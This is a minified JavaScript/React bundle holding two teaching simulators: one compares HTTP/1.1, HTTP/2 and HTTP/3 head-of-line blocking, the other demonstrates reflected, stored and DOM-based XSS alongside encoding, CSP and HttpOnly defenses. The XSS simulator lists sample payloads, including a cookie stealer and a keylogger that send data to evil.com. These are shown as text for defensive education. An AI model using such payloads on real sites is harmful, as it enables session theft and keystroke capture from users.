import { r as h, j as e, R as ReactDOM } from '../shared/vendor-react.js';

// Statements are in their original bundle order; definitions the extraction dropped were restored from it.
const Xt="#0f1419";
const Tu="#1a1f2e";
const Ee="#2a2f3e";
const Ge="#e6e6e6";
const Fe="#8a93a6";
const da="#4a7cff";
const pa="#f5c451";
const kr="#f66";
const zs="#5cd894";
const Va="#8a6cff";
const Mu="#2aa1b3";
const fn=[{key:"h1",label:"HTTP/1.1",tagline:"6 TCP connections · 1 request-at-a-time per conn",accent:Mu},{key:"h2",label:"HTTP/2",tagline:"1 TCP conn + multiplexed streams · TCP HoL still bites",accent:Va},{key:"h3",label:"HTTP/3",tagline:"1 QUIC conn · independent streams · HoL immunity",accent:zs}];
function Ao(n){return n<1024?`${n}B`:n<1024*1024?`${(n/1024).toFixed(1)}KB`:`${(n/1024/1024).toFixed(2)}MB`}
function Ga(n){return n==null?"—":`${n}ms`}
function Pu({version:n,snap:t,resources:s}){const r=n.accent,o=t.completedAt,i=t.connections.length;return e.jsxs("div",{className:"http-col",style:{borderTop:`3px solid ${r}`},children:[e.jsxs("div",{className:"http-col-head",children:[e.jsx("div",{className:"http-col-title",style:{color:r},children:n.label}),e.jsx("div",{className:"http-col-tag",children:n.tagline}),e.jsxs("div",{className:"http-col-meta",children:["conns: ",e.jsx("strong",{children:i})," · retransmits:"," ",e.jsx("strong",{children:t.retransmits})," · now:"," ",e.jsxs("strong",{children:[t.now,"ms"]}),o!=null&&e.jsxs(e.Fragment,{children:[" ","· ",e.jsxs("span",{style:{color:zs},children:["done @",o,"ms"]})]})]})]}),e.jsx("div",{className:"http-lanes",children:t.resources.map(a=>{const l=Math.round(a.progress*100),d=a.state==="blocked",c=a.state==="done",p=a.state==="pending";let m=r;return d?m=kr:c?m=zs:p&&(m=Fe),e.jsxs("div",{className:"http-lane",children:[e.jsxs("div",{className:"http-lane-label",children:[e.jsx("span",{className:"http-lane-kind","data-kind":a.kind,children:a.kind}),e.jsx("span",{className:"http-lane-name",children:a.name}),e.jsx("span",{className:"http-lane-size",children:Ao(a.size)})]}),e.jsxs("div",{className:"http-bar-wrap",children:[e.jsx("div",{className:"http-bar"+(d?" http-bar-blocked":"")+(c?" http-bar-done":""),style:{width:`${l}%`,background:m}}),d&&e.jsx("div",{className:"http-bar-blocked-overlay"}),e.jsxs("div",{className:"http-bar-pct",children:[l,"%"]})]}),e.jsxs("div",{className:"http-lane-right",children:[d&&e.jsx("span",{className:"http-badge http-badge-block",children:"BLOCKED"}),c&&e.jsx("span",{className:"http-badge http-badge-done",children:Ga((a.doneAt||0)-(a.startedAt||0))}),p&&e.jsx("span",{className:"http-badge http-badge-pending",children:"queued"})]})]},a.id)})}),e.jsx("div",{className:"http-conns",children:t.connections.map(a=>e.jsxs("span",{className:"http-conn",children:[e.jsxs("span",{className:"http-conn-id",children:[a.kind==="quic"?"quic#":"tcp#",a.id]}),e.jsx("span",{className:"http-conn-bytes",children:Ao(a.bytesTransferred)}),a.isBlocked&&e.jsx("span",{className:"http-conn-blocked",children:"stalled"})]},a.id))})]})}
function Ou({snaps:n}){const t=n.h1,s=n.h2,r=n.h3,o={h1:t.completedAt,h2:s.completedAt,h3:r.completedAt};let i="Start the simulation and watch each row fill. A packet loss on HTTP/2 freezes every stream; on HTTP/3 only the affected stream stalls.";const a=["h1","h2","h3"].filter(l=>o[l]!=null);if(a.length===3){const l=a.reduce((p,m)=>o[p]<o[m]?p:m),d=a.reduce((p,m)=>o[p]>o[m]?p:m),c=p=>fn.find(m=>m.key===p).label;o.h2>o.h1?i=`H2 finished at ${o.h2}ms — slower than H1's ${o.h1}ms because a single packet loss stalled all ${s.resources.length} streams (TCP HoL). H3 finished at ${o.h3}ms: loss isolated to one stream.`:o.h3<=o.h2&&o.h3<=o.h1?i=`H3 won at ${o.h3}ms thanks to per-stream independence. H2 = ${o.h2}ms (shared stall), H1 = ${o.h1}ms (independent conns but serial per conn).`:i=`Fastest: ${c(l)} @${o[l]}ms. Slowest: ${c(d)} @${o[d]}ms. Raise the loss rate to emphasise the HoL gap.`}return e.jsxs("div",{className:"http-section",children:[e.jsx("div",{className:"http-section-label",children:"Comparison"}),e.jsx("div",{className:"http-summary",children:fn.map(l=>{const d=n[l.key],c=d.connections.reduce((p,m)=>p+m.bytesTransferred,0);return e.jsxs("div",{className:"http-summary-card",children:[e.jsx("div",{className:"http-summary-label",style:{color:l.accent},children:l.label}),e.jsxs("div",{className:"http-summary-row",children:[e.jsx("strong",{children:"page load"}),e.jsx("span",{children:d.completedAt!=null?Ga(d.completedAt):"…"})]}),e.jsxs("div",{className:"http-summary-row",children:[e.jsx("strong",{children:"bytes"}),e.jsx("span",{children:Ao(c)})]}),e.jsxs("div",{className:"http-summary-row",children:[e.jsx("strong",{children:"retransmits"}),e.jsx("span",{children:d.retransmits})]}),e.jsxs("div",{className:"http-summary-row",children:[e.jsx("strong",{children:"conns"}),e.jsx("span",{children:d.connections.length})]})]},l.key)})}),e.jsx("div",{className:"http-narrative",children:i})]})}
function Lu({snaps:n}){const t=[];for(const r of fn)for(const o of n[r.key].events)t.push({...o,version:r.label,accent:r.accent});t.sort((r,o)=>o.t-r.t);const s=t.slice(0,10);return e.jsx("div",{className:"http-log",children:s.length===0?e.jsx("div",{className:"http-log-line http-log-muted",children:"(press Start — loss & completion events land here)"}):s.map((r,o)=>e.jsxs("div",{className:"http-log-line",children:[e.jsxs("span",{className:"http-log-time",children:[r.t,"ms"]}),e.jsxs("span",{className:"http-log-tag",style:{color:r.accent},children:["[",r.version,"]"]}),e.jsx("span",{className:"http-log-type",style:{color:r.type==="loss"?kr:r.type==="done"||r.type==="done-res"?zs:Fe},children:r.type}),e.jsx("span",{className:"http-log-text",children:r.text})]},o))})}
const Fu=`
.http-root {
  color: ${Ge};
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  padding: 16px;
  background: ${Xt};
}
.http-panel {
  background: ${Tu};
  border: 1px solid ${Ee};
  border-radius: 10px;
  padding: 16px 18px;
  max-width: 1200px;
  margin: 0 auto;
}
.http-title-row {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  padding-bottom: 12px;
  border-bottom: 1px solid ${Ee};
  gap: 12px;
}
.http-title {
  font-size: 18px;
  font-weight: 600;
  color: ${Ge};
}
.http-subtitle {
  font-size: 12px;
  color: ${Fe};
  margin-top: 2px;
}
.http-title-controls { display: flex; gap: 8px; }
.http-controls {
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
  padding: 10px 0;
  border-bottom: 1px solid ${Ee};
}
.http-label {
  color: ${Fe};
  font-size: 13px;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}
.http-unit {
  color: ${Ge};
  font-size: 12px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  min-width: 80px;
}
.http-hint {
  color: ${Fe};
  font-size: 11px;
  margin-left: auto;
  font-style: italic;
}
.http-btn {
  padding: 5px 14px;
  background: ${da};
  border: none;
  border-radius: 5px;
  color: white;
  font-weight: 500;
  cursor: pointer;
  font-size: 13px;
  transition: filter 0.15s;
}
.http-btn:hover:not(:disabled) { filter: brightness(1.15); }
.http-btn:disabled { opacity: 0.5; cursor: not-allowed; }
.http-btn-ghost {
  background: transparent;
  border: 1px solid ${Ee};
  color: ${Ge};
}
.http-sep {
  width: 1px;
  height: 22px;
  background: ${Ee};
  margin: 0 4px;
}
.http-cols {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
  padding: 14px 0;
  border-bottom: 1px solid ${Ee};
}
@media (max-width: 960px) {
  .http-cols { grid-template-columns: 1fr; }
}
.http-col {
  background: ${Xt};
  border: 1px solid ${Ee};
  border-radius: 6px;
  padding: 10px 12px 12px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.http-col-head {
  border-bottom: 1px dashed ${Ee};
  padding-bottom: 8px;
}
.http-col-title {
  font-size: 14px;
  font-weight: 700;
  letter-spacing: 0.02em;
}
.http-col-tag {
  font-size: 11px;
  color: ${Fe};
  margin-top: 2px;
  font-style: italic;
}
.http-col-meta {
  margin-top: 6px;
  font-size: 11px;
  color: ${Fe};
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}
.http-col-meta strong {
  color: ${Ge};
  font-weight: 600;
}
.http-lanes {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.http-lane {
  display: grid;
  grid-template-columns: 130px 1fr 80px;
  align-items: center;
  gap: 8px;
  padding: 4px 0;
}
.http-lane-label {
  font-size: 11px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  color: ${Ge};
  display: flex;
  flex-direction: column;
  gap: 1px;
  overflow: hidden;
}
.http-lane-kind {
  font-size: 9px;
  text-transform: uppercase;
  color: ${Fe};
  letter-spacing: 0.1em;
  font-weight: 700;
}
.http-lane-kind[data-kind="html"] { color: ${da}; }
.http-lane-kind[data-kind="css"] { color: ${Va}; }
.http-lane-kind[data-kind="img"] { color: ${pa}; }
.http-lane-kind[data-kind="js"] { color: ${zs}; }
.http-lane-name {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.http-lane-size {
  color: ${Fe};
  font-size: 10px;
}
.http-bar-wrap {
  position: relative;
  height: 16px;
  background: rgba(255,255,255,0.05);
  border: 1px solid ${Ee};
  border-radius: 3px;
  overflow: hidden;
}
.http-bar {
  height: 100%;
  transition: width 0.1s linear, background 0.2s;
  border-radius: 2px;
}
.http-bar-done {
  filter: brightness(1.1);
}
.http-bar-blocked {
  background: ${kr} !important;
  animation: http-blink 0.6s ease-in-out infinite;
}
.http-bar-blocked-overlay {
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(
    45deg,
    transparent 0,
    transparent 4px,
    rgba(255,102,102,0.25) 4px,
    rgba(255,102,102,0.25) 8px
  );
  pointer-events: none;
  animation: http-blink 0.6s ease-in-out infinite;
}
@keyframes http-blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.55; }
}
.http-bar-pct {
  position: absolute;
  right: 4px;
  top: 0;
  bottom: 0;
  display: flex;
  align-items: center;
  font-size: 10px;
  color: ${Ge};
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  text-shadow: 0 0 3px ${Xt};
}
.http-lane-right {
  text-align: right;
  font-size: 10px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
}
.http-badge {
  display: inline-block;
  padding: 1px 6px;
  border-radius: 3px;
  font-weight: 700;
  font-size: 9px;
  letter-spacing: 0.04em;
}
.http-badge-block {
  background: ${kr};
  color: ${Xt};
  animation: http-blink 0.6s ease-in-out infinite;
}
.http-badge-done {
  background: ${zs};
  color: ${Xt};
}
.http-badge-pending {
  background: transparent;
  color: ${Fe};
  border: 1px solid ${Ee};
}
.http-conns {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  padding-top: 8px;
  border-top: 1px dashed ${Ee};
}
.http-conn {
  display: inline-flex;
  gap: 4px;
  align-items: center;
  padding: 2px 6px;
  background: rgba(255,255,255,0.03);
  border: 1px solid ${Ee};
  border-radius: 3px;
  font-size: 10px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  color: ${Fe};
}
.http-conn-id { color: ${Ge}; font-weight: 600; }
.http-conn-bytes { color: ${Ge}; }
.http-conn-blocked {
  color: ${kr};
  font-weight: 700;
}
.http-section {
  padding: 12px 0;
  border-bottom: 1px dashed ${Ee};
}
.http-section:last-of-type { border-bottom: none; }
.http-section-label {
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  color: ${Fe};
  margin-bottom: 8px;
  font-weight: 600;
}
.http-summary {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 10px;
}
@media (max-width: 720px) {
  .http-summary { grid-template-columns: 1fr; }
}
.http-summary-card {
  background: ${Xt};
  border: 1px solid ${Ee};
  border-radius: 5px;
  padding: 8px 10px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 11.5px;
}
.http-summary-label {
  font-weight: 700;
  margin-bottom: 4px;
  font-size: 12px;
}
.http-summary-row {
  display: flex;
  justify-content: space-between;
  padding: 1px 0;
  color: ${Fe};
}
.http-summary-row strong {
  color: ${Ge};
  font-weight: 500;
}
.http-summary-row span { color: ${Ge}; }
.http-narrative {
  margin-top: 10px;
  padding: 8px 10px;
  background: ${Xt};
  border-left: 3px solid ${pa};
  border-radius: 4px;
  font-size: 12px;
  color: ${Ge};
  line-height: 1.45;
}
.http-log {
  margin-top: 8px;
  padding: 8px 12px;
  background: ${Xt};
  border: 1px solid ${Ee};
  border-radius: 6px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 11px;
  max-height: 140px;
  overflow-y: auto;
}
.http-log-line {
  padding: 2px 0;
  line-height: 1.4;
  border-bottom: 1px dotted ${Ee};
  display: flex;
  gap: 8px;
  color: ${Ge};
}
.http-log-line:last-child { border-bottom: none; }
.http-log-muted { color: ${Fe}; }
.http-log-time {
  color: ${Fe};
  width: 54px;
  flex-shrink: 0;
  text-align: right;
}
.http-log-tag {
  width: 72px;
  flex-shrink: 0;
  font-weight: 700;
}
.http-log-type {
  width: 66px;
  flex-shrink: 0;
  text-transform: uppercase;
  font-size: 10px;
  letter-spacing: 0.04em;
}
.http-log-text {
  color: ${Ge};
}
`,rn=[{id:"reflected",name:"Reflected",blurb:"Attacker crafts a URL with the payload in the query string. Victim clicks it; the server echoes the payload back in the HTML unescaped. Script runs in the victim's origin on page load."},{id:"stored",name:"Stored",blurb:"Attacker posts the payload once (a comment, a profile bio). The DB keeps it. Every subsequent viewer pulls it down and the script runs in their browser."},{id:"dom",name:"DOM-based",blurb:"Server returns a clean page. Client-side JS reads the URL hash/query and injects it into the DOM (innerHTML, document.write). Server-side encoding never sees the payload."}],nn=[{id:"cookie-steal",label:"cookie stealer",script:"<script>fetch('//evil.com?c='+document.cookie)<\/script>",intent:"exfiltrate session cookie to attacker-controlled host",stealsCookie:!0},{id:"deface",label:"deface page",script:"<script>document.body.innerHTML='OWNED'<\/script>",intent:"rewrite the DOM to show attacker content",stealsCookie:!1},{id:"keylog",label:"keylogger",script:"<script>addEventListener('keydown', e => fetch('//evil.com/k?x='+e.key))<\/script>",intent:"stream every keystroke to attacker",stealsCookie:!1}],Ya=[{id:"encode",label:"Output encoding",hint:"HTML-escape at render time: `<` becomes `&lt;`, etc. Payload becomes text, not markup."},{id:"csp",label:"CSP: script-src 'self'",hint:"Browser refuses to execute inline scripts or scripts from other origins. Belt-and-braces against encoding bugs."},{id:"httpOnly",label:"HttpOnly cookie",hint:"document.cookie cannot see the session cookie, so even a successful XSS cannot steal it."}];
function co(n){return String(n).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;")}
function Du(n,t=32){return n.length<=t?n:n.slice(0,t-1)+"…"}
class qu{constructor({variant:t="reflected",defenses:s={}}={}){this.variant=t,this.defenses={encode:!!s.encode,csp:!!s.csp,httpOnly:!!s.httpOnly},this.db=[],this.crafted=null,this.lastRender=null,this.events=[],this._seq=0}setVariant(t){if(t!=="reflected"&&t!=="stored"&&t!=="dom")throw new Error(`unknown variant ${t}`);this.variant=t,this.crafted=null,this.lastRender=null,this._log(`variant switched to ${t}. Scenario reset.`)}setDefense(t,s){var r;if(!(t in this.defenses))throw new Error(`unknown defense ${t}`);this.defenses[t]=!!s,this._log(`defense ${t} ${s?"ENABLED":"disabled"}. `+(s?((r=Ya.find(o=>o.id===t))==null?void 0:r.hint)||"":"attack surface widened."))}attackerCraftUrl(t){if(this.variant==="reflected"){const s="https://vuln.app/search?q="+encodeURIComponent(t.script);return this.crafted={kind:"url",url:s,payload:t},this._log(`attacker crafted URL for /search?q=... containing ${t.id} payload.`),s}if(this.variant==="dom"){const s="https://vuln.app/welcome#name="+encodeURIComponent(t.script);return this.crafted={kind:"hash",url:s,payload:t},this._log("attacker crafted URL with #name=<payload>. Fragment never hits the server."),s}if(this.variant==="stored"){const s="https://vuln.app/thread/42";return this.crafted={kind:"link",url:s,payload:t},this._log(`attacker prepared a link to the poisoned thread at ${s}.`),s}return null}attackerPost(t){if(this.variant!=="stored")throw new Error("attackerPost only meaningful for the stored variant");const s=++this._seq,r={id:s,author:"mallory",body:t.script};return this.db.push(r),this.crafted={kind:"post",postId:s,payload:t},this._log(`attacker POST /comments with body=${Du(t.script,40)}. Server stored row #${s} in the DB as-is.`),r}victimVisit(t){var w;const{variant:s,defenses:r}=this,o=(w=this.crafted)==null?void 0:w.payload;if(!o)return this._log("victim visited but attacker has not acted yet."),this.lastRender=null,null;const i=o.script,a=co(i);let l="",d=!1,c="";s==="reflected"?l=`<!doctype html>
<html><body>
  <h1>Search results for: ${r.encode?a:i}</h1>
  <ul><li>...</li></ul>
</body></html>`:s==="stored"?l=`<!doctype html>
<html><body>
  <h2>Thread #42</h2>
`+this.db.map(j=>{const $=r.encode?co(j.body):j.body;return`    <div class="comment"><b>${co(j.author)}</b>: ${$}</div>`}).join(`
`)+`
</body></html>`:s==="dom"&&(l=`<!doctype html>
<html><body>
  <h2>Welcome, <span id="name"></span></h2>
  <script>document.getElementById('name').innerHTML = decodeURIComponent(location.hash.slice(6));<\/script>
</body></html>`,d=!0);let p=!1;s==="reflected"||s==="stored"?r.csp?(p=!1,c="CSP script-src 'self' blocked the inline <script> regardless of whether it was encoded."):r.encode?(p=!1,c="Output encoding turned the payload into harmless text (&lt;script&gt;…)."):(p=!0,c=s==="reflected"?"Server reflected attacker-controlled input unescaped; browser parsed and executed the injected <script>.":"Stored payload was served to the victim unescaped; browser executed it."):s==="dom"&&(r.csp?(p=!1,c="CSP script-src 'self' blocked the inline script inserted via innerHTML. (Note: innerHTML <script> tags generally do not execute, but event-handler attributes and <img onerror> would — CSP stops those too.)"):r.encode?(p=!0,c="Server-side output encoding does NOT help DOM-based XSS: the sink (innerHTML) is in the client, after the server is done. Script ran."):(p=!0,c="Client-side innerHTML with attacker-controlled input → injected markup parsed as DOM. Script ran."));let m=!1;p&&o.stealsCookie&&(r.httpOnly?(m=!1,c+=" Cookie-stealing payload fired, but document.cookie cannot see the HttpOnly session cookie — no leak."):(m=!0,c+=" document.cookie was readable; session cookie exfiltrated to //evil.com."));const g=[];return g.push(`victim GET ${t||"(no url)"}`),s==="stored"&&g.push(`server pulled ${this.db.length} comment row(s) from DB`),g.push(`server responded ${r.encode&&!d?"(encoded)":"(raw)"}`+(r.csp?" + CSP header 'script-src 'self''":"")),g.push(p?"browser EXECUTED the payload":"payload BLOCKED"),o.stealsCookie&&g.push(m?"cookie LEAKED":p?"cookie safe (HttpOnly)":"cookie safe (no exec)"),this._log(g.join(" · ")),this.lastRender={html:l,rawPayload:i,encodedPayload:a,scriptRan:p,cookieLeaked:m,reason:c,sink:s==="reflected"?"server → HTML body":s==="stored"?"DB → server → HTML body":"client JS → innerHTML"},this.lastRender}snapshot(){var t;return{variant:this.variant,defenses:{...this.defenses},crafted:this.crafted?{kind:this.crafted.kind,url:this.crafted.url,postId:this.crafted.postId,payloadId:(t=this.crafted.payload)==null?void 0:t.id}:null,db:this.db.map(s=>({...s})),lastRender:this.lastRender?{...this.lastRender}:null,events:this.events.slice()}}resetRun(){this.db=[],this.crafted=null,this.lastRender=null,this._seq=0,this._log("simulation reset — DB cleared, no pending attacker state.")}_log(t){this.events.push({seq:this.events.length+1,text:t}),this.events.length>40&&(this.events=this.events.slice(-40))}}
function Wu(n){const t=Object.entries(n).filter(([,s])=>s).map(([s])=>s);return t.length===0?"no defenses":t.map(s=>s==="csp"?"CSP 'self'":s==="httpOnly"?"HttpOnly":"encoding").join(" + ")}
const De="#0f1419",po="#1a1f2e",Re="#2a2f3e",be="#e6e6e6",$e="#8a93a6",bt="#4a7cff",fr="#f5c451",vt="#f66",We="#5cd894",ha={reflected:bt,stored:"#b084f9",dom:"#ff9f5a"};
function Bu(){var B,V,T;const[n,t]=h.useState("reflected"),[s,r]=h.useState(nn[0].id),[o,i]=h.useState({encode:!1,csp:!1,httpOnly:!1}),[a,l]=h.useState(null),[d,c]=h.useState("Pick a variant, pick a payload, then run the attacker + victim steps. Toggle defenses to see them land."),[p,m]=h.useState(0),g=h.useRef(null);h.useEffect(()=>{var b;const _=new qu({variant:n,defenses:o});g.current=_,l(_.snapshot()),c(`variant = ${n}. ${((b=rn.find(x=>x.id===n))==null?void 0:b.blurb)||""}`)},[n]),h.useEffect(()=>{const _=g.current;if(_){for(const b of Object.keys(o))_.defenses[b]!==o[b]&&_.setDefense(b,o[b]);l(_.snapshot())}},[o]);const w=h.useMemo(()=>nn.find(_=>_.id===s)||nn[0],[s]),C=h.useCallback(()=>{const _=g.current;_&&(n==="stored"?(_.attackerPost(w),c(`Attacker posted payload to /comments. Server stored it in the DB as row #${_.db.length}. Now every viewer of this thread will get it.`)):(_.attackerCraftUrl(w),c(n==="reflected"?"Attacker crafted a search URL with the payload in ?q=. Sends it to the victim (phishing, ad, DM).":"Attacker crafted a URL with payload in the #fragment. The fragment is never sent to the server — so server logs show nothing suspicious.")),l(_.snapshot()),m(b=>b+1))},[n,w]),j=h.useCallback(()=>{var f;const _=g.current;if(!_)return;const b=((f=_.crafted)==null?void 0:f.url)||null;if(!b){c("Victim cannot visit yet — attacker has not crafted the URL / posted the comment.");return}const x=_.victimVisit(b);l(_.snapshot()),m(u=>u+1),x&&c(x.reason)},[]),$=h.useCallback(()=>{const _=g.current;_&&(_.resetRun(),l(_.snapshot()),c("Reset. DB cleared; no crafted URL."))},[]),O=_=>i(b=>({...b,[_]:!b[_]}));if(!a)return e.jsx("div",{style:{color:be,padding:16},children:"loading…"});const q=a.lastRender,R=((B=a.crafted)==null?void 0:B.url)||null,D=ha[n];return e.jsxs("div",{className:"xss-root",children:[e.jsx("style",{children:Ku}),e.jsxs("div",{className:"xss-panel",children:[e.jsxs("div",{className:"xss-title-row",children:[e.jsxs("div",{children:[e.jsx("div",{className:"xss-title",children:"XSS: Attack + Defense — System Design Primer"}),e.jsx("div",{className:"xss-subtitle",children:"reflected · stored · DOM-based · output encoding · CSP · HttpOnly"})]}),e.jsxs("div",{className:"xss-title-controls",children:[e.jsx("span",{className:"xss-label",children:"Variant:"}),e.jsx("span",{className:"xss-toggle",children:rn.map(_=>e.jsx("button",{className:"xss-toggle-opt"+(n===_.id?" active":""),style:{background:n===_.id?ha[_.id]:"transparent",color:n===_.id?De:$e},onClick:()=>t(_.id),type:"button",children:_.name},_.id))}),e.jsxs("label",{className:"xss-label",children:["Payload: ",e.jsx("select",{value:s,onChange:_=>r(_.target.value),children:nn.map(_=>e.jsx("option",{value:_.id,children:_.label},_.id))})]}),e.jsx("button",{className:"xss-btn xss-btn-ghost",onClick:$,type:"button",children:"Reset"})]})]}),e.jsxs("div",{className:"xss-scenario-desc",style:{borderLeftColor:D},children:[e.jsxs("strong",{style:{color:D},children:[(V=rn.find(_=>_.id===n))==null?void 0:V.name,":"]})," ",(T=rn.find(_=>_.id===n))==null?void 0:T.blurb]}),e.jsxs("div",{className:"xss-defense-bar",children:[e.jsx("span",{className:"xss-label",children:"Defenses:"}),Ya.map(_=>{const b=!!o[_.id];return e.jsxs("button",{className:"xss-defense-pill"+(b?" on":""),onClick:()=>O(_.id),type:"button",title:_.hint,children:[e.jsx("span",{className:"xss-defense-dot"}),_.label," ",e.jsx("span",{className:"xss-defense-state",children:b?"ON":"off"})]},_.id)}),e.jsxs("span",{className:"xss-defense-summary",children:["active: ",e.jsx("strong",{children:Wu(o)})]})]}),e.jsxs("div",{className:"xss-columns",children:[e.jsxs("div",{className:"xss-col",children:[e.jsxs("div",{className:"xss-col-title",children:["1. Attacker ",e.jsx("span",{className:"xss-variant-pill",style:{background:D,color:De},children:n})]}),e.jsxs("div",{className:"xss-col-sub",children:[n==="reflected"&&"crafts a URL; needs the victim to click.",n==="stored"&&"posts once; everyone reads it.",n==="dom"&&"puts payload in the #fragment; server never sees it."]}),e.jsxs("div",{className:"xss-block",children:[e.jsx("div",{className:"xss-block-hd",children:"selected payload"}),e.jsxs("div",{className:"xss-payload",children:[e.jsxs("div",{className:"xss-payload-label",children:[w.label,w.stealsCookie&&e.jsx("span",{className:"xss-tag danger",children:"cookie-stealer"})]}),e.jsx("pre",{className:"xss-code",children:w.script}),e.jsx("div",{className:"xss-payload-intent",children:w.intent})]})]}),e.jsxs("div",{className:"xss-block",children:[e.jsx("div",{className:"xss-block-hd",children:"action"}),e.jsx("button",{className:"xss-btn xss-btn-attack",onClick:C,type:"button",children:n==="stored"?"POST /comments ▶":"Craft URL ▶"}),a.crafted&&e.jsxs("div",{className:"xss-block-body","data-flash":p,children:[a.crafted.kind==="url"&&e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"xss-mini",children:"crafted URL:"}),e.jsx("pre",{className:"xss-code xss-code-wrap",children:a.crafted.url})]}),a.crafted.kind==="hash"&&e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"xss-mini",children:"URL with #fragment (server never sees after the #):"}),e.jsx("pre",{className:"xss-code xss-code-wrap",children:a.crafted.url})]}),a.crafted.kind==="post"&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"xss-mini",children:["posted comment #",a.crafted.postId,"; link:"]}),e.jsx("pre",{className:"xss-code xss-code-wrap",children:"https://vuln.app/thread/42"})]})]})]})]}),e.jsxs("div",{className:"xss-col",children:[e.jsx("div",{className:"xss-col-title",children:"2. Server"}),e.jsxs("div",{className:"xss-col-sub",children:[n==="reflected"&&"reflects ?q= into the HTML response",n==="stored"&&"stores comments, renders them to every viewer",n==="dom"&&"returns a clean static page; payload lives client-side"]}),e.jsxs("div",{className:"xss-block",children:[e.jsx("div",{className:"xss-block-hd",children:"database / store"}),n==="stored"?a.db.length===0?e.jsx("div",{className:"xss-empty",children:"(no comments yet)"}):e.jsx("div",{className:"xss-db",children:a.db.map(_=>e.jsxs("div",{className:"xss-db-row",children:[e.jsxs("span",{className:"xss-db-id",children:["#",_.id]}),e.jsxs("span",{className:"xss-db-author",children:[_.author,":"]}),e.jsx("span",{className:"xss-db-body",children:_.body})]},_.id))}):e.jsxs("div",{className:"xss-empty",children:["(not used — ",n==="reflected"?"reflected":"DOM"," variant does not persist the payload)"]})]}),e.jsxs("div",{className:"xss-block",children:[e.jsxs("div",{className:"xss-block-hd",children:["response headers ",o.csp&&e.jsx("span",{className:"xss-tag good",children:"CSP on"}),o.httpOnly&&e.jsx("span",{className:"xss-tag good",children:"HttpOnly"})]}),e.jsx("pre",{className:"xss-code xss-code-small",children:`HTTP/1.1 200 OK
Content-Type: text/html${o.csp?`
Content-Security-Policy: script-src 'self'`:""}
Set-Cookie: session=abc123; Path=/${o.httpOnly?"; HttpOnly; Secure; SameSite=Lax":""}`})]}),e.jsxs("div",{className:"xss-block",children:[e.jsxs("div",{className:"xss-block-hd",children:["render pipeline",o.encode&&n!=="dom"&&e.jsx("span",{className:"xss-tag good",children:"encoded"}),o.encode&&n==="dom"&&e.jsx("span",{className:"xss-tag warn",children:"encoded (no help here)"})]}),e.jsxs("div",{className:"xss-pipeline",children:[n==="reflected"&&e.jsxs("code",{children:["html = `<h1>Search results for: ",o.encode?"htmlEscape(q)":"q","</h1>`"]}),n==="stored"&&e.jsxs("code",{children:["for row in db: out += `<div>author: ",o.encode?"htmlEscape(row.body)":"row.body","</div>`"]}),n==="dom"&&e.jsxs("code",{children:["server HTML is constant; client JS does"," ",e.jsx("b",{children:"element.innerHTML = location.hash"})]})]})]})]}),e.jsxs("div",{className:"xss-col",children:[e.jsx("div",{className:"xss-col-title",children:"3. Victim"}),e.jsx("div",{className:"xss-col-sub",children:"logged-in user; browser runs whatever the page tells it"}),e.jsxs("div",{className:"xss-block",children:[e.jsx("div",{className:"xss-block-hd",children:"action"}),e.jsx("button",{className:"xss-btn xss-btn-victim",onClick:j,type:"button",disabled:!R,children:"Victim clicks URL ▶"}),!R&&e.jsx("div",{className:"xss-mini",children:"have the attacker craft the URL / post first."})]}),q&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"xss-block","data-flash":p,children:[e.jsx("div",{className:"xss-block-hd",children:"outcome"}),e.jsxs("div",{className:"xss-outcome",children:[e.jsxs("div",{className:"xss-outcome-row",children:[e.jsx("span",{className:"xss-outcome-k",children:"Script executed?"}),e.jsx("span",{className:"xss-outcome-v",style:{color:q.scriptRan?vt:We},children:q.scriptRan?"✅ YES (bad)":"❌ no (defense held)"})]}),e.jsxs("div",{className:"xss-outcome-row",children:[e.jsx("span",{className:"xss-outcome-k",children:"Cookie leaked?"}),e.jsx("span",{className:"xss-outcome-v",style:{color:q.cookieLeaked?vt:We},children:q.cookieLeaked?"✅ YES (session stolen)":"❌ no"})]}),e.jsxs("div",{className:"xss-outcome-row",children:[e.jsx("span",{className:"xss-outcome-k",children:"Sink"}),e.jsx("span",{className:"xss-outcome-v xss-mono-sm",children:q.sink})]})]})]}),e.jsxs("div",{className:"xss-block",children:[e.jsx("div",{className:"xss-block-hd",children:"HTTP response body (as rendered)"}),e.jsx("pre",{className:"xss-code xss-code-small xss-code-wrap",children:Hu(q.html,q.rawPayload,q.encodedPayload,o.encode&&n!=="dom")}),e.jsx("div",{className:"xss-mini",children:"shown as text, never injected into this page as markup."})]})]})]})]}),e.jsxs("div",{className:"xss-status",children:[e.jsx("span",{className:"xss-status-dot",style:{background:q?q.scriptRan?vt:We:bt,boxShadow:`0 0 8px ${q?q.scriptRan?vt:We:bt}`}}),e.jsx("span",{className:"xss-status-text",children:d})]}),a.events.length>0&&e.jsxs("div",{className:"xss-events",children:[e.jsx("div",{className:"xss-events-hd",children:"event 